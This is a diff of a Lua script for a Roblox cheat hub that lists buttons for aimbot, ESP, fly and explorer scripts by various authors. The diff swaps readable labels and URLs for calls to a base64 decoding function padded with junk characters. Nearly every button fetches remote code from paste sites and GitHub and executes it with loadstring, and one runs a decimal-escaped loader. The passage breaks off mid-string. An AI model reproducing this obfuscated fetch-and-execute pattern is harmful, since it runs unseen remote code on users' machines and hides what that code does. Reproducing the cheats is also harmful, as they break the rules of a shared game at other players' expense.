+    loadstring(game:HttpGet(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('BzxHSsfKtCCapCUMLpQcZIBvdERyeewRUhawMQjHnPSNWCkjVIRwjcCwxrUMpZQLLluINhaHR0cHM6Ly9zaHouYWwveHRRUA==')))()
+end)
+    credits:Button(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('EaLQjAsxRfKOYqTCXHoCSyCOawlSQRXVTHJZvdoGEtYHaHvfWhYqWLpfFVhwaQqHKzGWeh6ICB5aSW6Lef6Liq6ISa5pysMuOAjumcgOimgeiHquW3seaQnOe0ou+8jOS9huaYr+eCueWHu+WQjuWwseS4jeeUqOeCueWHu+S6hu+8jOWPquS4jei/h+S4jeiDveenu+WKqO+8jOmcgOimgeWPmOWwj+W7uuiuruaJvumclua6uuOAjw=='),function()
+    loadstring(game:HttpGet(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('SMrrXOQwmAPkvTPqgvlnXfgEQxivCWeuoOAOEcnTQCNxgWtsoYyEuzwiXSXGWoUbcXyplOaHR0cHM6Ly9zaHouYWwvfkxEU0xTNjY=')))()
+end)
+local credits = creds:section(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('CCqjPqCGxwiFYxDoTLkMBwGFvMEVVvhIZKaLCYAUglzVEixEUCATIVfsgXUmYDSTTRlwSu6YCa55So6ISa5pys'),true)
+    credits:Button(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('wTSDqcHHVtxvzZotZQTaYusPiRxVEguLHnkatMPxoWgEdnKGWhfhiaaXKZFKWFMovgzyBN5bel5YW35YyF'),function()
+    loadstring(game:HttpGet(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('ywkNrkGWrbqXBzrrlPiFNIdFOCHIqiybbtTstxgFTwDjFapIoecJxOIslRSsARxIHSyELcaHR0cHM6Ly9jZG4ud2VhcmVkZXZzLm5ldC9zY3JpcHRzL0JUb29scy50eHQ=')))()
+end)
+    credits:Button(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('MOhwYanrsCGqjfxrvooiIoFIeaVtpccDiIebGsEAUfCvtgmsBClLWiucmVwuJDaDeTKjir6aqC5Lq65peg6L+d6KeE'),function()
+    loadstring(game:GetObjects(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('HxrojUyVVoRnwAKpZLkskTXGYmuRgXZfaBGpZiYAfSlgZrnannYEIrpuURUXgHTDIIiMfVcmJ4YXNzZXRpZDovLzEyNjI0MzU5MTI='))[1].Source)()
+end)
+    credits:Button(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('DivhuatdqFYDHblZXdEIIeOrHtehrDuhWBynAlJVJKvvpPTklYALunugwryYeoHjKdyWPn6LaF6auY55S76LSo'),function()
+    loadstring(game:HttpGet(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('nzBUnIDldBjyhsPdEiGiNpVEjTEZojtzRYVnMWpCPcCEcuTZunuMRWztjrCTeRjqPoRWXkaHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L2pIQmZKWW1T')))()
+end)
+    credits:Button(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('vMniWJlamJHFlffNvuMdoyWSSHOJYwQunVKlepTFPeEDYBzynmJFCHrdKygPxQjRFDPlbb5bel5YW35oyC'),function()
+    loadstring(game:HttpGet(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('aVosHAnxRKQhXhiUSZZJmOdFwuZbwZNfUtPIcVsmiJIoiFJQIyydjtMQBBoRESgoQxQKacaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0JlYm8tTW9kcy9CZWJvU2NyaXB0cy9tYWluL1N0YW5kQXdla2VuaW5nLmx1YQ==')))()
+end)
+    credits:Button(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('LhFnwuUrtJXexpbqjaXmFMBgQGTzYFRFQJRsMCjEZbXZuMPimBEhjVZHKcpeOzvfddGCkS55S16ISR6ZSu55uY'),function()
+    loadstring(game:HttpGet(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('PSvHKkMoJejykRqwzijczLFLVpBTgjRipzJfqjfUfHTkmUavOETxeHMQmvUpAVUOQbQDfNaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Fkdnh6aXZoc2pqZGh4aHNpZGlmdnNoL21vYmtleWJvYXJkL21haW4vbWFpbi50eHQ='), true))()
+end)
+    credits:Button(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('htMjVBaxFkEAsdhMDzFDOaDsqafporiZTggumDyaxcQloYeQZIyWwIXsGtiBzYOpbKOvMX5a6Z5pav6aOe6KGMVjPjgI7mnKrmsYnljJbjgI8='),function()
+    loadstring(game:HttpGet(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('pRftNEhfBtGXHzHBtWXWwLYIadihEjxKVamujgKxOHpXNJSGBIUqZfZvBeNfdrQOknuNBcaHR0cHM6Ly9zaHouYWwvfkFyY2V1c1hGbHlWMw==')))()
+end)
+    credits:Button(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('aGCmvFBaPXogJktaejgLlRAxIDXieKVnkIPyepSrqbaARoCCGKUDyRnvczWlwhuMjorqJfS1JOTA=='),function()
+    loadstring(game:HttpGet(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('cnbbowfQhaIRXOVLjXIBacgszjzUuAFjedQnHFdZYgWrLtKTsZoOdqlRPdNsObRepJGbshaHR0cHM6Ly9zaHouYWwvfktSTkxSb2Jsb3hTY2lycHQ=')))()
+end)
+    credits:Button(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('lujWFaljrDimbzankXXthGVrSkVgidaxJMKdIPhXYEUVrkpJbFSYCZsSMAPMLNPHnVNiQs5a6Z5pav6Ieq556E44CO5pyq5rGJ5YyW44CP'),function()
+    loadstring(game:HttpGet(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('gbuCcCfHyjlLJPkBrzLmiICAFbVgndIMbgPjwBqOckonUGcAEEqcuVBvnozkUnBoCQtPkCaHR0cHM6Ly9zaHouYWwvfkFyY2V1c1hBaW1ib3Q=')))()
+end)
+    credits:Button(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('dlzhTrhyCjNUjPgbEfLwjReBnScZnCVJtAypLAXmqANZDsMmAsHmQDfaQhpUXwhlLzqjFXU29uaWM='),function()
+    loadstring(game:HttpGet(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('CmGEjgLFopKAebPyaYRHGoWEwulfkbAwSQQxjVbcQwgWEMBBrFoOKUslPXgESpXfiYVUiMaHR0cHM6Ly9zaHouYWwvflNvbmljUm9ibG94U2NpcnB0')))()
+end)
+    credits:Button(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('jrxZLGbUDjvJRCfnJJPLRtayuyQXCFXOGRdqsfFiekPLZhJzXPeNNXAhIJwiAzpOVPTkLYVGlnZXI='),function()
+    loadstring(game:HttpGet(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('NVWJeSxOyNHRpnQNpGUYczASQpzTYnPrxGwKgOLCCUtCaaKbiBDvtfybCffLPnqMaecaJRaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2JhbGludFRoZURldlgvVGlnZXJYLVYyL21haW4vQmFjaw==')))()
+end)
+    credits:Button(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('GhFwWnjLjoGtHhdnbvQstirKhlmdkEFbRqiVSqCxxudoVXUrHfbkaWjaigZkcrnjaFjvqpQWx5c3Nl'),function()
+    loadstring(game:HttpGet(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('VSmnpkPBxejgJwjdnyMDpfnPXoAQJlniKzQxicBqRnQYSxYEaiOJwBUpOUvCQaMMuSSVEHaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL05hdGhUaGVEZXYvQWx5c3NlQW5kcm9pZC9tYWluL2xvYWRlci5sdWE=')))()
+end)
+    credits:Button(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('EOwLojVVOnyHhxCiyRlhoCYplQLaYczBxCTKqMAOuGhZiTWpywfggEpbLurwgEoJmLinoW5a6Z5pavVjM='),function()
+    loadstring(game:HttpGet(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('AzBObSHnrzHWbbFAjKRQeXocLiKfKoeYAnfLSvlmEwDqPHRfsiUTJNRKYgbNisageiHkoEaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0FaWXNHaXRodWIvY2hpbGx6LXdvcmtzaG9wL21haW4vQXJjZXVzJTIwWCUyMFYz')))()
+end)
+    credits:Button(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('oDrAQtngRoRyZPPgrwTvWThfcGqTusONxTgqYViTRabblRDkdOzZfjWInJADjVAzmgygeuYWNyeWxpeA=='),function()
+    loadstring(game:HttpGet(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('qXqVMiskpXvfbDUjaaCaPlswtoLoCpuIQzQFoPpnooNoxCmHoHyGRhJDgXtNXQazOjRSOEaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tLzNkc29uc3VjZS9hY3J5bGl4L21haW4vQWNyeWxpeA==')))()
+end)
+    credits:Button(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('AgEAPYbOPQiIFvUobFSiMqXYnDbXJMaWIBxOJWguRZjgCovnAStsLAfeWbjyWpqXmSgxqB6YCP6KeG'),function()
+    loadstring(game:HttpGet(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('VgyFdzgamGiGaqgyJsQOWMOfuLLisoSGQKpfJSJFnhsrGuCyYdKKoBCFqMUjaFMYBaNBraaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0x1Y2FzZmluMDAwL1NwYWNlSHViL21haW4vVUVTUA==')))()
+end)
+    credits:Button(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('CulSsIjFuiJMdxBuObyAPGicxxeWDCfHJdapALIqMUDBFCQrUtUBOKfVRtSqjUPApnYrgtU3luYXBzZQ=='),function()
+    loadstring(game:HttpGet(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('xtZGcDdRpBpscbjjPLlXLPXIKRiyFmRGcBmYCzJekNEtzjmtPxyQEmAWBchFgOXhKAlAuEaHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L3RXR3hoTnEw')))()
 end)
 
-local creds = window:Tab("老外脚本",'16060333448')
+local creds = window:Tab(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('syyZJZHyoZuNRnKyvloQNxGoHaysLDRegEhoqCAlIPxsKuvPzIiZLOlNnbEipbRosLFUcS6ZyW5rq65rGJ5YyW6Zi/5bCU5a6Z5pav6ISa5pys'),tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('JQRIcEwZFhsYMpFzlPGMYoKJnYmAxscvSZoApomkibJLUbJFSZhoVKtIxTMtFWKpSocJwzMTYwNjAzMzM0NDg='))
 
-local credits = creds:section("『LINNI Script』",true)
-    credits:Button("老外通用",function()
-    loadstring(game:HttpGet("https://shz.al/~jdjsjs"))()
+local credits = creds:section(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('lAZpoeYcTsoxPqnSoEmHptnOehbxGtqyxSLJZwvgkUCIfXRjCcKNQHVmxJEhewtLtmgFQJ44COTElOTkkgU2NyaXB044CP'),true)
+    credits:Button(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('utavPilcYfxWOikNWNwNaYapVKrhEceueTvXWhURKcNCsupsVEtzqdEeWsPoxIulDvdZQr6ZyW5rq65rGJ5YyW6Zi/5bCU5a6Z5pav556E5YeG'),function()
+    loadstring(game:HttpGet(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('LhvYaZQLdPGofuKLOPhIBOMvxCiLmioyeIKdgIVUqyekTVhwZaffcgUlYDKNCPmuvyxnbdaHR0cHM6Ly9zaHouYWwvfktLQQ==')))()
+end)
+    credits:Button(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('dGphgoQbIYVNKdySGkkYeJXtNqBmVEZYjEKqvmWBecqRFgtpFGvJvczYaEqVGzmGnPeSXz6ZyW5rq65rGJ5YyW6Zi/5bCU5a6Z5pav6aOe6KGM44CO5o6o6I2Q55So6L+Z5Liq6aOe6KGM44CP'),function()
+    loadstring(game:HttpGet(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('AfWpqikOEABqyDFUSVGKoZvNsbIvFPrxoaqjBeJSbPrqxYvaHmBcnxQNqSHfkHHCwWDNpYaHR0cHM6Ly9zaHouYWwvfktLREtT')))()
+end)
+    credits:Button(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('ikWCMuPchFvILqYDTiICHkUGByiBpFmkjmPHRECCIahAbptIPMCdkiPJnzHuvlgbWQkKwy6ZyW5rq655S16ISR56uvRVNQ44CO5om+5LiN5Yiw6Zi/5bCU5a6Z5pavRVNQ5omA5Lul55So6L+Z5Liq57uY5Yi25pu/5Luj44CP'),function()
+    loadstring(game:HttpGet(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('NodrBbYxrHXnPaaEqwJSSbqdctGJvqsBHIbEfQBZtCNJLqpvdsQAzFuRIOYnVGmvPyqUrFaHR0cHM6Ly9zaHouYWwvfk1NU0pT')))()
+end)
+    credits:Button(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('VSvNFwGoShBkRWmyPEKoMAjoMoYtqNqWNOypfYLyNPrhpgjyMzYmpWMQEYNFfWzWniDFuw6L+Z5Liq5rqQ5aSq6ZW/5LqG6ZyW5rq65peg6IO95Li65Yqb44COREVYLUV4cGxvcmVy44CP'),function()
+    loadstring(game:HttpGet(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('UDTBbpbkUFVncgmcRicBlqgPXqLDwoazruIwREBQpcCPEolSDHDdEMlbygiiFIhCPzCzUFaHR0cHM6Ly9jZG4ud2VhcmVkZXZzLm5ldC9zY3JpcHRzL0RleCUyMEV4cGxvcmVyLnR4dA==')))()
+end)
+    credits:Button(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('MshtxmCJfdxDBeeZLalxBRtzqbuJgBQkitgvdQXkWoITBlnQldtTtoqgrlBYoihLrOZWmG5Y+m5LiA56eNZXNw44CO6ZyW5rq65om+55qE44CP'),function()
+    loadstring(game:HttpGet(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('kbMZDcQyxzZmLKUKMIyNbcORjYjkxNsQisoCffHrJdGTwHRIhvVojviSFcRxqLYOfgczQAaHR0cHM6Ly9jZG4ud2VhcmVkZXZzLm5ldC9zY3JpcHRzL1dSRCUyMEVTUC50eHQ=')))()
+end)
+    credits:Button(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('VRYQPQlWlRfubAbemBBpkcHqTvxnMVRHZDoCmdpHTFLouqPhijbMHtlCCNRCUfFOzEXFJXaW5maW5pdGUtWWllbGTjgI7mh5LlvpfmsYnljJbkuobjgI8='),function()
+    loadstring(game:HttpGet(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('WWeKMhwptmIdhaHmOjuCLCwLTyYxAJPnIGQQedgrApZnvVPzxjsTwEEPwymGAxyAcQmBvYaHR0cHM6Ly9zaHouYWwvfkRDRkY=')))()
 end)
 
-local creds = window:Tab("帮助者脚本",'16060333448')
+local creds = window:Tab(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('reKSClAQddFhctTAuOGaVQhIXyMyKsaFbxagcBhIbzwPnVhOKmcgpsTQtsEwLYizLLPUaq6ICB5aSW6ISa5pys'),tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('gYIDkukGAdwCbHxoTSTTZDXSyElrNtzSFYnYGqkZlYOSJVcVpnjIrchuxfUMYeuuagKPcbMTYwNjAzMzM0NDg='))
 
-local credits = creds:section("『LINNI Script』",true)
-    credits:Button("白貓『美』",function()
-    loadstring(game:HttpGet("https://shz.al/~lihhh"))()
+local credits = creds:section(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('afCetCpIADzzQxmskWurYfwmgLHrzSOpWrdBgYyCaqRUjCurshaOweFodvogwOdGZzgcGn44COTElOTkkgU2NyaXB044CP'),true)
+    credits:Button(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('GqSeSCQOtMTPRxUZnHtuWXHrLbxxcMAXgyZDGNHWYGRLlXhIyStGYKCepNMbBHjGwaJtnV6ICB5aSW6YCa55So'),function()
+    loadstring(game:HttpGet(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('nFrXoihchGLzfPzdzJewYXdvkKdbVPgGUDonCfHFIFXPMhOpaShWbwzFPeecepAarlvkBfaHR0cHM6Ly9zaHouYWwvfmpkanNqcw==')))()
 end)
 
-local creds = window:Tab("各位脚本作者脚本",'16060333448')
+local creds = window:Tab(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('RXSrIwwOxTBkFJxKclDIKqWsuzTtEaEUPkDfMdHMqlfYfxarfpjSDHcFbTxvENHXPMlcjj5biu5Yqp6ICF6ISa5pys'),tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('fuNhJaxFlrshScvyhNbqGlUyYiLNLtdEtlAkoJUTAEEuKDjQKxtrvidjYFNUgvhbTaoADdMTYwNjAzMzM0NDg='))
+
+local credits = creds:section(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('UbgDAFytYaJvsspAYzYuCHVEWQsdbtgONzBlSQEAZCkWYcJqXYoPBGZaOODIMrXUZLiSjX44COTElOTkkgU2NyaXB044CP'),true)
+    credits:Button(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('xniSZxLBfgvOfYKXyhnrkvDRgynQzIUunWkYbVsfODgHqIOIpEpjfjRaUcUwumSTEpyNfv55m96LKT44CO576O44CP'),function()
+    loadstring(game:HttpGet(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('nPbfWOvNFGUPhIdNrhAJCGeqsVRmHnbOCCGVujbnGMREIagePCDRzMmsWySGTDvYFQMMhmaHR0cHM6Ly9zaHouYWwvfmxpaGho')))()
+end)
+
+local creds = window:Tab(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('khqGkJjidofHFzhObKTqfWULQQdaTeOQXpRNcdzawyMvBRNwPEhPGkGcFnLnmbKnBIRhny5ZCE5L2N6ISa5pys5L2c6ICF6ISa5pys'),tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('AcFmOlMGqczNhqEGPUaCFwMvZVpEzJzRWmiQnwbTpNzfOppuWaCdTuCpHmaDxIIWhfzjNMMTYwNjAzMzM0NDg='))
     
-local credits = creds:section("作者脚本",true)
-    credits:Button("林脚本",function()
-    lin = "作者林"lin ="林QQ群 747623342"loadstring(game:HttpGet("https://raw.githubusercontent.com/linnblin/lin/main/lin"))()
+local credits = creds:section(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('eiIGUKNnAmDVFyWhGLUVtUXbpaPrEvhGVFIXeXqCFvRNiBSBzqOCDFMjYoTZTYsbTrsRPT5L2c6ICF6ISa5pys'),true)
+    credits:Button(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('DmqHPyhUEDuPGGqXyIcohRBhiOQZmrsuaNXZOhJKErLnsbTTAPgTqNnForRANyjukhiRta5p6X6ISa5pys'),function()
+    lin = tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('fUKygBgEEqIWfrOmutTQfTbeeXAVJoVNhySQjhcShmCVfXoQBvbSCRlPoaoBGhmkgMUZaS5L2c6ICF5p6X')lin =tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('DnoySntZPrRlAPUMkqRETrQrZPvwAJTxkCbnuHHMjToHEXxoMsLhjkLSNSUJRmBHyewbbD5p6XUVHnvqQgNzQ3NjIzMzQy')loadstring(game:HttpGet(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('DdjbVUobCKFYzQQnJZYjRVyPFtzvpKRwVnMakwnywYREPnOeSNOvVtCvXwaUCWPBowTojIaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2xpbm5ibGluL2xpbi9tYWluL2xpbg==')))()
 end)
-    credits:Button("鸭hub『鸭不更了霖溺来』",function()
-    loadstring(game:HttpGet("https://shz.al/~cfde212"))()
+    credits:Button(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('GRGYVGyWIHFsvfTgvWVPpsxiwRBjdhTYOMVzdRRafsBRHecAdVZaJOjcypJrqvUzSseCHv6bitaHVi44CO6bit5LiN5pu05LqG6ZyW5rq65p2l44CP'),function()
+    loadstring(game:HttpGet(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('XcBpWESfcTZRAnjPUvIYXlFsTkmIOZBbbwqOyuZMDfegyKwEZCqaHvmgMQMwkZqChnrvQpaHR0cHM6Ly9zaHouYWwvfmNmZGUyMTI=')))()
 end)
-    credits:Button("龙脚本",function()
-    getgenv().long = "龙脚本，加载时间长请耐心"loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\108\121\121\97\105\110\105\47\108\111\110\47\109\97\105\110\47\108\105\115\119\109\34\41\41\40\41")()
+    credits:Button(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('CNIvzSUTskgQgTWPxzNlUbDwCSwNYRlDvpPzyjaSZEwHNzESISeIhDagSEbofmswiDKKXT6b6Z6ISa5pys'),function()
+    getgenv().long = tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('yWUkLzsOGKxgsFrZkDUqCEjyzJWySxndgnWYJETExLqsuBIfdCJMnVvwVDvXEiRzrFRKlf6b6Z6ISa5pys77yM5Yqg6L295pe26Ze06ZW/6K+36ICQ5b+D')loadstring(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('zQMOVpoBVwslxRlWbGhxxZtZCVnhJZymfrkVBDxtZlDsKDvJFWZIlHTYxUUnimrNSKYLMKXDEwOFwxMTFcOTdcMTAwXDExNVwxMTZcMTE0XDEwNVwxMTBcMTAzXDQwXDEwM1w5N1wxMDlcMTAxXDU4XDcyXDExNlwxMTZcMTEyXDcxXDEwMVwxMTZcNDBcMzRcMTA0XDExNlwxMTZcMTEyXDExNVw1OFw0N1w0N1wxMTRcOTdcMTE5XDQ2XDEwM1wxMDVcMTE2XDEwNFwxMTdcOThcMTE3XDExNVwxMDFcMTE0XDk5XDExMVwxMTBcMTE2XDEwMVwxMTBcMTE2XDQ2XDk5XDExMVwxMDlcNDdcMTA4XDEyMVwxMjFcOT